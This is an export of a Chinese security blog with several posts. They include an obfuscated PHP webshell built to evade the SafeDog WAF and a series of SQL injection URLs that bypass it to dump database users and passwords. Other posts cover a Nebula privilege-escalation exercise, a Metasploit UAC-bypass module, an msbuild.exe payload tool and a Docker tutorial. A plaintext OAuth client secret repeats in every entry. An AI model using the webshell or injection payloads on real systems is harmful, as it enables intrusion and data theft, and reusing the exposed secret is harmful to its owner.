    <content type="text"><![CDATA[环境:php+mysql+apche安全狗:apache版本+8.10规则库即刻安全即刻安全纯技术交流群：307283889如需转载，请联系本博主声明，私自转载必追究 Prat 1在bypass小分队中V@1n3R表哥提到他明天会分享过waf的一句话爱搞事的我当然不能只做伸手党,于是决定也分享一些出来,可是发现许久没有做渗透测试了手里并没有过waf的一句话了，没办法只好临时刚几个出来 思路构思以及实现本次bypass需要用的一个函数： substr() //用于返回字符串的一部分。 其实这个想法很早就有了，不过好像也有大佬有成品，不过我没看见过(可能是很久没接触渗透测试了)于是今天晚上就试了一下其实不管怎么绕过，一句话最终还是：assert($_POST['x']); 所谓的绕过无非就是把这一段进行处理让他达到一个过waf的效果 Prat 2巧用substr函数绕过安全狗思路成品：&lt;?php $a = substr("abcdefghijklmnopqrstufwxyz",0,1); $b = substr("abcdefghijklmnopqrstufwxyz",17,3); $c = substr("abcdefghijklmnopqrstufwxyz",3,2); $ss = $a.$b.$c; $d = $ss[0].$ss[2].$ss[2]; //ass $dd = $ss[5].$ss[1].$ss[3]; //ert $x = $d.$dd;$x($_POST['x']);?&gt; 这里主要关注这两行$d = $ss[0].$ss[2].$ss[2]; //ass$dd = $ss[5].$ss[1].$ss[3]; //ert$x = $d.$dd; 上面说了，一句话最终结果还是assert($_POST[‘x’]); 所以这里的$x肯定是assert输出一下就知道。如图：可以看见echo 出来了assert那么他是如何得到assert的呢，我们来看一下$x = $d.$dd; 可以发现，$x通过$d跟$dd拼接得到的$d跟$dd是通过截取$ss的字符串得到的我们分别来输出一下每一个变量获取到的字符串可以发现$a = a //从字符串的第0个字符开始截取，向右截取1个字符$b = rst //从字符串的第17个字符开始截取，向右截取3个字符$c = de //从字符串的第17个字符开始截取，向右截取3个字符$ss = arstde //为三个变量的拼接的来 那么整个过程就很好理解$d = ass //分别截取$ss的第0,2,2字符$dd = ert //分别截取$ss的第5,1,3字符最后拼接成assert 看一下是否能过狗完美过狗，并没有拦截 var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>bypass</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bypass_safedog系列2]]></title>
    <url>%2Fbypass_safedog.html</url>
    <content type="text"><![CDATA[环境:php+mysql+apche安全狗:apache版本+8.10规则库即刻安全即刻安全纯技术交流群：307283889如需转载，请练习本博主声明，私自转载必追究 prat 1本文大致内容+ 思路以及想法 - 四重注释绕过safedog+ 实战绕过 - 绕过and 1=1 - 绕过union+select - 爆表 - 爆字段 - 读内容 prat 2测试代码&lt;?php$link = mysqli_connect('localhost','root','root','security');$sql = "select * from users where id=".$_GET['id'];$result = mysqli_query($link,$sql);if($rows = mysqli_fetch_array($result))&#123; echo $rows['id']; echo '&lt;br&gt;'; echo $rows['username']; echo '&lt;br&gt;'; echo $rows['password']; echo '&lt;br&gt;';&#125;mysqli_close($link);?&gt; prat 3绕过 and 1=1url:http://192.168.1.107/sql.php?id=1 and 1=1 发现惨遭拦截，首先让我们来看一下他拦截什么，不拦截什么。and 不拦截and 1 拦截and 1 = 拦截and 1 = 1 拦截 由此可见，只要and后面出现数字或者成立一个等式那么他就拦截，那我们用/**/注释来绕过一下看看/**/aNd/**//**/&apos;a&apos;/**/ = /**/&apos;a&apos;/**/ 注释包含把1=1替换成‘a’ = ‘a’就得到了url:http://192.168.1.107/sql.php?id=1/**/aNd/**//**/&apos;a&apos;/**/=/**/&apos;b&apos;/**/ 返回不正常(等式不等)并且发现狗就不拦截了，可见注释方法还是如此任性 Order by我发现我装的狗是不会拦截order by的，所以也就没绕，有需求在说。字段为3，接下来爆库，当前用户。 绕过union+selecturl:http://192.168.1.107/sql.php?id=1 UNION SELECT 1,2,3 同样，先看一下他拦截什么。union 不拦截select 不拦截union select 拦截 很明显，我们只需要在union与select之间处理一下就可以了。首先使用/!50000/注释包含/!/然后使用/**/与/–*/打乱一下结构，在稍微进行一下编码处理就可以了url:http://192.168.1.107/sql.php?id=-1 /*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect 1,2,3)/*--*/*/-- - 可以发现，已经正常显示数字，并且狗没有拦截。 什么？你说没看懂？那么看下图拆分一下就发现其实很好理解，使用()把select的内容包起来。 爆库http://192.168.1.107/sql.php?id=-1 /*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect 1,user(),database())/*--*/*/-- - 发现又特么拦截了，很明显，他会拦截一些常用系统函数(还有许多就不列出来了，列出常用的)1. version()——MySQL 版本2. user()——数据库用户名3. database()——数据库名4. @@datadir——数据库路径5. @@version_compile_os——操作系统版本 既然已经知道了拦截什么，那么绕他还难么，掏出/**/注释大法。在user(),database()之间处理以下。那么就成为了user/**/(/**/)database/**/(/**/)完整url：http://192.168.1.107/sql.php?id=-1/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect 1,user/**/(/**/),database/**/(/**/))/*--*/*/-- - 正常爆出数据库跟当前用户 爆表发现我本身的狗可能有点问题，他不拦截from，于是也没有绕，还是那句话，需要啥，绕啥。url:http://192.168.1.107/sql.php?id=-1/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect database/**/(/**/),group_concat(concat_ws(0x23,table_name)),user/**/(/**/)from information_schema.tables where table_schema=&apos;security&apos;)/*--*/*/ limit 0,1-- - 得到tableemailsreferersuagentsusers 爆字段url:http://192.168.1.107/sql.php?id=-1/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect database/**/(/**/),group_concat(concat_ws(0x23,column_name)),user/**/(/**/)from information_schema.columns where table_name=&apos;users&apos;)/*--*/*/ limit 0,1-- - 得到columnidusernamepassword 读内容url:http://192.168.1.107/sql.php?id=-1/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect database/**/(/**/),group_concat(concat_ws(0x23,username,password)),user/**/(/**/)from users)/*--*/*/ limit 0,1-- - dumpDumb#Dumb var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>bypass</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Exploit-Exercises--00&01笔记]]></title>
    <url>%2Fexploit-exercises00-01.html</url>
    <content type="text"><![CDATA[决定和你们分享一下，这个东西真的好玩 ！刺激！！给力！！！https://exploit-exercises.com/exploit-exercises.com提供了各种虚拟机，文档和挑战，可用于了解各种计算机安全问题，例如特权升级，漏洞分析，漏洞开发，调试，逆向工程和一般网络安全问题。&nbsp;&nbsp;那么我们就现在来一盘紧张又刺激的漏洞利用练习吧 1.下载Nebula&nbsp;&nbsp;点击下载 =&gt; https://drive.google.com/drive/folders/0B9RbZkKdRR8qLWZBcVBvanlLb1U&nbsp;&nbsp; 登录使用。下载完以后呢和我使用的界面是一样的&nbsp;&nbsp; 3. level00关于此级别要求您找到将作为“flag00”帐户运行的设置用户ID程序。您还可以通过仔细查看/可疑目录中的顶级目录来找到此信息。要访问此级别，请使用level00的密码登录为level00。进来以后我们看到用户id是level00&nbsp;那么我找了找在home目录中发现有很多文件夹 分别查看了使用权限。可以看到level00和flag00 这两个文件夹只有属于level00这个用户级别的 。其他的文件夹属于其他的用户的级别。&nbsp;&nbsp;其实到了这里，个人的思路也就断了 ，不得已从网上找了一份答案 做了一个参考这位作者呢通过用户名和用户组去搜索命令,于是跟着他的思路走着，找到了第一条flag&nbsp;&nbsp;&nbsp;&nbsp;越权成功&nbsp;http://www.cnblogs.com/zealoct/p/3511762.html 4. level01在下面的程序中有一个漏洞，允许任意程序被执行，你能找到吗？无奈我还是做了弊，看了视频才知道是怎么回事！https://www.youtube.com/watch?v=-mtOlyxyJx4要做这个级别，请使用密码level01作为level01帐户登录 。该级别的文件可以在/ home/flag01中找到。 &nbsp;进入level01这个账户后根据提示在/ home/flag01，发现有flag01这个文件 ，我尝试的执行这个文件 得到了 and now what?输出&nbsp;&nbsp;根据源代码可以看到setresuid（）设置调用进程的真实用户ID，有效用户ID和保存的set-user-ID。非特权用户进程可以将真实的UID，有效的UID和保存的set-user-ID，各自改为以下之一：当前的真实UID，当前有效UID或当前保存的set-user-ID。特权进程（在Linux上，具有CAP_SETUID功能的进程）可以将真正的UID，有效的UID和保存的set-user-ID设置为任意值。setresgid（）设置真正的GID，有效的GID和保存的调用进程的set-group-ID（并且始终将文件系统GID修改为与有效GID相同），对非特权进程具有相同的限制。 关键点还是在/usr/bin/env ，源代码中使用system 调用系统命令 ，使用env 这个命令，去输出 and now what?这个字符串&nbsp;&nbsp;Linux系统里的env命令 可以显示当前用户的环境变量，还可以用来在指定环境变量下执行其他命令。下面来比较一下set，env和export命令的异同：set命令显示当前shell的变量，包括当前用户的变量;env命令显示当前用户的变量;export命令显示当前导出成用户变量的shell变量。每个shell有自己特有的变量（set）显示的变量，这个和用户变量是不同的，当前用户变量和你用什么shell无关，不管你用什么shell都在，比如HOME，SHELL等这些变量，但shell自己的变量不同shell是不同的，比如BASH_ARGC，BASH等，这些变量只有set才会显示，是bash特有的，export不加参数的时候，显示哪些变量被导出成了用户变量，因为一个shell自己的变量可以通过export “导出”变成一个用户变量。 可以看到 在PATH 中环境变量中有带s的，意思就是spuer了，在视频中大牛进行了用户环境变量（包括源代码中 也是使用env 中 去输出字符串）进行特定的权限赋予。&nbsp;&nbsp;可以对比 对用户变量的前后改变&nbsp;&nbsp;当我再次运行的时候发现是失败的，原因是出在那呢&nbsp;&nbsp;这意味着我们可以提供我们自己的echo，修改路径，以便这个echo被调用优先于内置，然后我们可以运行任意命令。当然是少了echo 这个文件&nbsp;&nbsp;越权成功，得到了flag var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bypassuac_Comhijack ---kali linux]]></title>
    <url>%2Fbypassuac-comhijack.html</url>
    <content type="text"><![CDATA[前天看了一个国外大牛的视频，觉得很有意思。就决定和你们分享一下 https://www.youtube.com/watch?v=HNRrmfuTRCY https://securityonline.info/metasploit-add-com-class-id-hijack-method-bypassing-uac-windows-x86-x64-7810200820122016/ UAC简称 用户帐户控制， UAC 是Windows Vista中引入了通过防止程序的管理权限，除非批准的用户提供额外的安全功能。以下是用户在尝试运行程序或访问需要许可的Windows的一部分时可能看到的UAC确认对话框的图片。 Metasploit模块 https://raw.githubusercontent.com/OJ/metasploit-framework/6ee5d83a157e7887c262ffa42b89ab061e7e8d8c/modules/exploits/windows/local/bypassuac_comhijack.rb 该模块将通过在HKCU配置单元中创建COM处理程序注册表项来绕过Windows UAC。当加载某些高完整性流程时，将引用这些注册表项，从而导致加载用户控制的DLL的进程。这些DLL包含导致高级会话的有效载荷。有效负载调用后清除注册表项的修改。该模块需要有效负载的架构来匹配操作系统，但目前的低权限Meterpreter会话架构可能不同。如果在单独的进程中启动有效负载后指定EXE :: Custom，您的DLL应该调用ExitProcess（）。该模块通过目标上的cmd.exe调用目标二进制文件。因此，如果cmd.exe访问受到限制，则此模块将无法正常运行。 （以上引用大神文章） 视频演示： var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/bypassuac_comhijack.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); 1.下载bypassuac_comhijack.rb curl -o bypassuac_comhijack.rb https://raw.githubusercontent.com/OJ/metasploit-framework/6ee5d83a157e7887c262ffa42b89ab061e7e8d8c/modules/exploits/windows/local/bypassuac_comhijack.rb &nbsp;&nbsp;&nbsp;&nbsp;2.将下载的bypassuac_comhijack.rb 剪贴到msf 中&nbsp;&nbsp; 需要的到一个Meterprerter的会话 比如我这里使用我个人的脚本,第三个得到Meterprerter的会话。&nbsp;&nbsp; &nbsp; 3.使用bypassuac_comhijack&nbsp;&nbsp;&nbsp;看到需要设置的是会话序列号，我这里设置 session 为 1，并且执行payload的时候，会报错，让我们看看需要更改的地方？&nbsp;&nbsp;因为目标虚拟机win10镜像本身是x64架构的，所以我们这里需要更改payload&nbsp;&nbsp;&nbsp;并且更改端口&nbsp;（PS:如果目标机是32位的话，不用更改PAYLOAD 只需更改端口即可） 4.得到session 2&nbsp;&nbsp;这里可以看到 我getuid的时候 是demon 用户当我getsystem的时候 ，得到了system权限。&nbsp; var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nop-Payload]]></title>
    <url>%2Fnop-payload.html</url>
    <content type="text"><![CDATA[视频演示： var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/nop-payload.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); 新工具发布：NPS_Payload 在过去一年中，我们看到了大量的研究成果，其中强调了Microsoft的本机二进制文件，这些二进制文件可以被攻击者利用来妥协或获取系统访问权限。这些二进制文件之一msbuild.exe已被证明是非常可靠的，允许我们在后处理场景中在主机上获取shell。 Casey Smith（@subtee）撰写了几篇关于如何使用msbuild.exe从.csproj或.xml文件执行代码的文章。Casey发现有几个部分允许有人添加任何想要的代码，当msbuild.exe分析文件时，它将执行这些代码块。这允许一个人将任何C＃代码添加到csproj或xml文件中。 两个TrustedSec团队成员Larry Spohn和Ben Mauch决定将Ben的“不PowerShell”（NPS）和Dave Kennedy的独角兽和Casey的示例一起进行了一些功能的混合，并提出了一个新的工具称为nps_payload。&nbsp;&nbsp;此工具提供了一种生成将被插入到msbuild_nps.xml文件中的PowerShell有效负载的方法，并且当msbuild.exe运行文件时将使用nps来执行有效负载。类似于Dave Kennedy的独角兽，nps_payload还提供了一个Metasploit控制台资源（msbuild_nps.rc）文件。&nbsp;&nbsp;有两种方法可以部署msbuild_nps.xml文件。第一个是将msbuild_nps.xml文件复制到远程主机，然后使用以下命令执行。 C：\ Windows \ Microsoft.NET \ Framework \ v4.0.30319 \ msbuild.exe C：\ 第二种方法是在SMB共享上托管msbuild_nps.xml文件，并使用UNC路径与msbuild.exe命令指向xml文件。 C：\ Windows \ Microsoft.NET \ Framework \ v4.0.30319 \ msbuild.exe \ \ \ msbuild_nps.xml 这将使用nps运行编码的PowerShell有效载荷，并将返回一个shell到攻击者。一旦攻击者迁移到新进程，msbuild.exe将退出。重要的是要注意，nps执行PowerShell代码而不调用powershell.exe，不会显示在事件ID 4688（新建进程）中。 对于Defenders，您可以通过监视任何调用msbuild.exe的事件ID 4688事件来检测此攻击，然后检查任何对UNC或本地文件的引用的命令行参数。您还可以启用PowerShell日志记录并监视事件ID 4104事件，并查找已编码的任何PowerShell代码。 github :www.github.com/trustedsec/nps_payloadhttps://www.trustedsec.com/2017/07/new-tool-release-nps_payload/ 安装部分pip install -r requirements.txtapt-get install sambavi / nano / whatever /etc/samba/smb.conf 3.）将以下内容添加到文件的底部（酌情更改）[payloads$]comment = Dirty Payloadspath = /opt/shares/payloadsbrowsable = yesguest ok = yesread only = yes service smbd restart 接下来 看视频如何操作演示的吧！！ var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的Docker不归路--重新认识docker]]></title>
    <url>%2F%E6%88%91%E7%9A%84%E5%9B%9E%E5%BD%92docker.html</url>
    <content type="text"><![CDATA[我的Docker不归路——(回归之作)&nbsp; 0x01 docker 简介&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（这篇文章本是不打算公开的，写下这篇文章本是在四月份的，现在打算将其公开）前段时间写了一份Dcoker_kali，docker对我来说可以使用docker_kalil inux,也可以部署我们安全工作的靶机环境，如前段时间，在我的msf系列课程中就用到了，如何部署docker-s2-046的靶机环境。它对我来说应用不止这么一点，可以部署DVWA、WebGoat等渗透环境，可当做一个渗透演练平台。之前留了一部分坑在那，这次我打算好好的完善此Docker_kali使用内容。&nbsp;&nbsp;重新认识Docker &nbsp;&nbsp;&nbsp;Docker 是个划时代的开源项目，它彻底释放了计算虚拟化的威力，极大提高了应用的运行效率，降低了云计算资源供应的成本！ 使用 Docker，可以让应用的部署、测试和分发都变得前所未有的高效和轻松！无论是应用开发者、运维人员、还是其他信息技术从业人员，都有必要认识和掌握 Docker，以在有限的时间内做更多有意义的事。&nbsp;&nbsp;在安装前，先了解一些主要的概念&nbsp;Docker 在Linux上安装过程里，你的物理机器既是本地主机也是Docker的宿主机。在网络里，本地主机的意思是你的计算机。Docker的宿主机是托管这容器运行的计算机。 &nbsp;在一个标准的Linux安装中，Docker客户端、Docker Daemon和一些运行中的容器会直接寄托在你的本地主机上。这意味着你可以使用标准的本地地址和端口去访问容器为什么要使用 Docker？ &nbsp;作为一种新兴的虚拟化方式，Docker 跟传统的虚拟化方式相比具有众多的优势。 更高效的利用系统资源 &nbsp;由于容器不需要进行硬件虚拟以及运行完整操作系统等额外开销，Docker 对系统资源的利用率更高。无论是应用执行速度、内存损耗或者文件存储速度，都要比传统虚拟机技术更高效。因此，相比虚拟机技术，一个相同配置的主机，往往可以运行更多数量的应用。 更快速的启动时间 &nbsp;传统的虚拟机技术启动应用服务往往需要数分钟，而 Docker 容器应用，由于直接运行于宿主内核，无需启动完整的操作系统，因此可以做到秒级、甚至毫秒级的启动时间。大大的节约了开发、测试、部署的时间。 一致的运行环境 &nbsp;开发过程中一个常见的问题是环境一致性问题。由于开发环境、测试环境、生产环境不一致，导致有些 bug 并未在开发过程中被发现。而 Docker 的镜像提供了除内核外完整的运行时环境，确保了应用运行环境一致性，从而不会再出现 “这段代码在我机器上没问题啊” 这类问题。 持续交付和部署 &nbsp;对开发和运维（DevOps）人员来说，最希望的就是一次创建或配置，可以在任意地方正常运行。 &nbsp;使用 Docker 可以通过定制应用镜像来实现持续集成、持续交付、部署。开发人员可以通过 Dockerfile 来进行镜像构建，并结合 持续集成(Continuous Integration) 系统进行集成测试，而运维人员则可以直接在生产环境中快速部署该镜像，甚至结合 持续部署(Continuous Delivery/Deployment) 系统进行自动部署。 &nbsp;而且使用 Dockerfile 使镜像构建透明化，不仅仅开发团队可以理解应用运行环境，也方便运维团队理解应用运行所需条件，帮助更好的生产环境中部署该镜像。 更轻松的迁移 &nbsp;由于 Docker 确保了执行环境的一致性，使得应用的迁移更加容易。Docker 可以在很多平台上运行，无论是物理机、虚拟机、公有云、私有云，甚至是笔记本，其运行结果是一致的。因此用户可以很轻易的将在一个平台上运行的应用，迁移到另一个平台上，而不用担心运行环境的变化导致应用无法正常运行的情况。 更轻松的维护和扩展 &nbsp;Docker 使用的分层存储以及镜像的技术，使得应用重复部分的复用更为容易，也使得应用的维护更新更加简单，基于基础镜像进一步扩展镜像也变得非常简单。此外，Docker 团队同各个开源项目团队一起维护了一大批高质量的官方镜像，既可以直接在生产环境使用，又可以作为基础进一步定制，大大的降低了应用服务的镜像制作成本。&nbsp;&nbsp;参考资料:https://yeasy.gitbooks.io/docker_practice/content/introduction/why.html&nbsp;&nbsp; 0x02windows 下安装docker&nbsp;Docker for Windows的安装与使用&nbsp;&nbsp;&nbsp;在Windows 10中，下载Docker for Windows的安装包，然后开始安装。正如上面所述，如果Hyper-V没有启用，安装过程会自动启用Hyper-V，这将需要重新启动Windows系统。安装完成后，就可以在Windows下使用Docker了。在安装docker for windows 之后 不能安装vm、vbox等虚拟机，如需安装vbox、vm等虚拟机可采用下一个docker tools box 安装方法。&nbsp; &nbsp;启动Docker for Windows，会在系统托盘部分显示一条小鲸鱼的图标：。在Docker完全启动之前，小鲸鱼背上的小方块会不停地闪烁变化，等小方块稳定不变后，表示系统完全启动成功，此时就可以对Docker的环境进行设置，或者开始执行Docker命令了。&nbsp;&nbsp;&nbsp;在Docker for Windows成功启动后，就可以在CMD下执行Docker命令了.&nbsp;&nbsp;Docker tools box的安装与使用 &nbsp;因为Docker Engine守护程序使用特定于Linux的内核功能，因此无法在Windows上本机运行Docker Engine。相反，你必须使用docker命令 docker-machine，创建并连接到一个小型的Linux VM您的计算机上。该VM在Windows系统上为您托管Docker Engine。 &nbsp;要运行Docker，您的计算机必须具有运行Windows 7或更高版本的64位操作系统。另外，您必须确保在您的计算机上启用虚拟化。 0x001&nbsp; 0x002&nbsp;安装完会有VirtualBox/Docker Quickstart Terminal /kitematic (GUI图形化管理工具)&nbsp;&nbsp;&nbsp; 0x003启动Dcoker tools box 报错该解决？ 解决方案：（Windows环境下手动更新boot2docker.iso）下载boot2docker.ISO 进行替换该C盘当前用户目录下的 .docker/machine/cache\boot2docker.iso 的boot2docker.iso这个镜像文件进行一个替换 即可解决下载错误。 0x03 linux下安装dockerlinux下安装docker最低系统安装要求为： Ubuntu 版本最低为 12.04 LTS，但从稳定性上考虑，推荐使用 14.04 LTS 或更高的版本。Debian 7 Wheezy (64-bit)（必须启用 backports)linux下安装docker 使用以下命令即可进行安装。我这边就使用深度linux64位 来举例子安装在linux下安装说明吧！ apt-get install docker.io &nbsp;建立 docker 用户组&nbsp; 默认情况下，docker 命令会使用 Unix socket 与 Docker 引擎通讯。而只有 root 用户和 docker 组的用户才可以访问 Docker 引擎的 Unix socket。出于安全考虑，一般 Linux 系统上不会直接使用 root 用户。因此，更好地做法是将需要使用 docker 的用户加入 docker 用户组安装docker.io 的时候已经自动添加了docker用户组，只需将当前非root权限的用户 添加docker组即可 usermod -aG docker $USER &nbsp;&nbsp;&nbsp; 0x04 Mac os X 下 安装苹果系统安装我这里就没什么好说的了，苹果系统下的都是一键安装的。Docker for mac 下载链接：https://www.docker.com/docker-mac去官网下载docker安装即可&nbsp;将安装包下载后，拖放应用程序即可。&nbsp;安装后，启动docker后可在，右上角看到docker -小鲸鱼的图标。 &nbsp;安装后可在终端下直接使用docker命令。&nbsp; &nbsp;&nbsp; 0x10 Docker 常用命令简单使用实例&nbsp;1.搜索镜像&nbsp; docker search 镜像名称 kali官方 docker镜像拉取说明:https://www.kali.org/news/official-kali-linux-docker-images/ 搜索kali 镜像 docker search kali &nbsp;2.docker_kali镜像拉取下载&nbsp; docker pull kalilinux/kali-linux-docker&nbsp; 不过在这里会产生一个问题，镜像下载慢！！因为镜像在国外,所以下载过程可能会延迟掉线这样会非常不友好。 &nbsp; 3.我们可以使用几个国内的docker镜像加速器 阿里云加速器&amp;DaoCloud 加速器！！！！！&nbsp;如果你使用的docker是docker for windows 、或者docker for mac 的话 推荐可使用‘DaoCloud 加速器’ https://www.daocloud.io/mirror#accelerator-doc &nbsp;一、在‘DaoCloud 加速器’ 注册登录后 进行复制镜像地址，到docker下进行设置。&nbsp; 二、右键点击桌面顶栏的 docker 图标，选择 Preferences，找到Daemon，在registy mirrors 中添加，并应用重启docker（apply&amp;restart）&nbsp; 4.如果你是linux 或者docker tools box 的话 可以选择阿里云加速器–docker镜像仓库。&nbsp;https://account.aliyun.com/login/login.htmoauth_callback=https%3A%2F%2Fcr.console.aliyun.com%2F&amp;lang=zh#/accelerator &nbsp;查看阿里云加速器操作文档，以及docker的版本，进行对应操作。&nbsp;&nbsp;配置完之后，镜像开启加速下载如下图；&nbsp; 5.创建并连接容器、端口映射、绑定随机id&nbsp; docker run -i -t –name kali -p 8081:80 -p 8080:8080 -p 4444:4444 -p 5555:5555 -p 2222:22 kalilinux/kali-linux-docker /bin/bash &nbsp;&nbsp;命令详解：一、run命令简单使用docker run -i -t //创建并连接容器， run命令参数使用 -i: 以交互模式运行容器，通常与 -t 同时使用；-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用&nbsp;在这里我们使用docker ps -a 查看docker容器运行、创建的历史记录，可以发现你每次创建一个容器的时候都会生成一个随机id、容器名称，在81324e6f0059我们可以看到，这是我们之前生成的，也是指定了容器的名称，将ID、名称附着在容器上。docker ps -a二、Docker 会为我们创建每一个容器自动生成一个随机ID、名称，如果想为容器指定一个名称，而不是使用自动生成的，则可以使用–name 来使用&nbsp;如：–name kali //指定容器名称为kali三、容器端口映射docker指令：docker run -p ip:hostPort:containerPort redis&nbsp;使用-p参数会分配宿主机的端口映射到虚拟机。IP表示主机的IP地址。hostPort表示宿主机的端口。containerPort表示虚拟机的端口。以下为端口映射实例图片对比：我们也可以采用 指定容器端口映射本机随机端口,防止本机端口占用等情况。格式为-p &lt;空&gt;:容器需映射端口可指定物理机的随机端口 映射容器端口 docker run -i -t -v /Users/demon:/root -p :4444 -p :5555 -p :22 kali /bin/bash&nbsp;端口被占用&nbsp;指定随机端口为空。&nbsp;映射为随机端口&nbsp;四、使用-v 参数实现目录共享挂载，docker可以支持把一个宿主机上的目录挂载到镜像里。通过-v参数，冒号前为宿主机目录，必须为绝对路径，冒号后为镜像内挂载的路径。现在镜像内就可以共享宿主机里的文件了。然而我这边不打算采用目录共享，可用ssh的特性进行文件传输上传下载等功能docker run -i -t -v /Users/demon:/root -p :4444 -p :5555 -p :22 kali /bin/bash&nbsp;6.查看列举本地镜像。&nbsp;docker images&nbsp;7.开启容器&nbsp;start命令docker start 容器ID or 容器名称&nbsp;docker start e8d612658eb0&nbsp;容器名称可指容器随机生成的名称亦可是–name 指定过的名称 如之前指定的是kali 这里就可以使用 docker start kali8.连接容器&nbsp;attach 命令docker attach 是Docker自带的命令。下面示例如何使用该命令。但是使用 attach 命令有时候并不方便。当多个窗口同时 attach 到同一个容器的时候，所有窗口都会同步显示。当某个窗口因命令阻塞时,其他窗口也无法执行操作了。&nbsp;同样docker attach 可以接上容器名称or 容器ID&nbsp;&nbsp;使用attach 窗口占用解决方案 &nbsp; 1.使用kimtematic GUI管理工具 点击exec。&nbsp;2.使用命令行 exec命令&nbsp;&nbsp;docker exec -it kali /bin/bash&nbsp;&nbsp;&nbsp;9.停止容器&nbsp;在容器内使用exit即停止容器&nbsp;或在容器外使用stop命令即停止容器&nbsp;10.删除容器&nbsp;rm命令使用rm命令之前必须停止该运行的容器。docker rm 容器id or 容器名称&nbsp;11.批量删除停止容器&nbsp;docekr ps -a -q 查看容器停止或者正在运行的容器iddocker rm 之前也说到过 是删除容器的意思，但是docker rm 本身默认的是不会删除正在运行的容器。如此一来 docker rm $(docker ps -a -q) 的意思就是 批量删除停止的容器。12.删除本地镜像 docker rmi 镜像名or 镜像ID 删除之前需停止容器并删除和该镜像关联的容器&nbsp;&nbsp;13.将容器做备份快照迁移。Docker是基于镜像的。镜像类似于已经包含了文件、配置和安装好的程序的虚拟机镜像。同样的，你可以像启动虚拟机一样启动多个镜像实例。运行中的镜像称为容器。你可以修改容器（比如删除一个文件），但这些修改不会影响到镜像。不过，你使用docker commit 命令可以把一个正在运行的容器变成一个新的镜像。&nbsp;docker save : 将指定镜像保存成 tar 归档文件。&nbsp;Export命令用于持久化容器（不是镜像）。&nbsp;以上同样都是导出，但是区别在于save 是导出镜像而不是导出容器，export是导出容器，历史记录但不能历史层回滚。反而使用export命令导出保存快照，你将无法回滚到之前的层(layer)。以下是使用导入save的镜像以及export的镜像，导入镜像的大小。&nbsp;&nbsp;docker load -i kali.tar &nbsp;&nbsp;docker import kali.tar kali&nbsp;&nbsp;&nbsp;14 .docker 资源占用之内存docker stats可以观察到此时的资源使用情况是固定不变的 docker stats&nbsp;使用-m 参数可指定内容（m、g）使用docker -m操作会使内存被限制为输入大小的两倍，内存上限为400m&nbsp;可使用内存压力测试工具：stress，对内存进行测试。若运行后在几秒内被杀死说明内存被限制为400M&nbsp;&nbsp;15.尝试写一份简单的Dockerfile&nbsp;FROM kalilinux/kali-linux-docker# 拉取官方kali镜像MAINTAINER Demon#注明作者RUN apt-get update &amp;&amp; apt-get install -y \ sqlmap \ ssh \ –no-install-recommends &amp;&amp; rm -rf /var/cache/apt/archives/*.deb#使run 命令 执行 要安装的软件如安装ssh 、sqlmap 以及清理缓存ADD sshd_config /etc/ssh/#添加本地文件到容器的/etc/ssh/sshd_config 进行替换。 dockerfile实现了自动拉去镜像、构建镜像、自动更新源、下载安装sqlmap、配置ssh等动作。&nbsp;docker build -t kalil . //编写完成 Dockerfile 后可以使用docker build来生成镜像。&nbsp;&nbsp; &nbsp;创建并连接容器 docker run -i -t –name=kali -p 8081:80 -p 8080:8080 -p 4444:4444 -p 5555:5555 -p 2222:22 kalil /bin/bash.实现sqlmap ssh等配置&nbsp;实现已配置ssh 下载链接：https://github.com/boot2docker/boot2docker/releaseshttps://www.docker.com dockerhttps://www.docker.com/docker-windows docker for windowshttps://www.docker.com/docker-mac docker for machttps://www.docker.com/products/docker-toolbox docker tools box参考资料：https://my.oschina.net/aixiaohua/blog/651171 Windows环境下手动更新boot2docker.isohttp://www.cnblogs.com/franson-2016/p/6412971.html 解决非root用户使用docker的办法https://yeasy.gitbooks.io/docker_practice/content/install/ubuntu.html docker入门实践亦可参考 我的好基友国光：http://www.sqlsec.com/2017/docker.html docker入门简明。http://www.tuicool.com/articles/EBNZBjJ 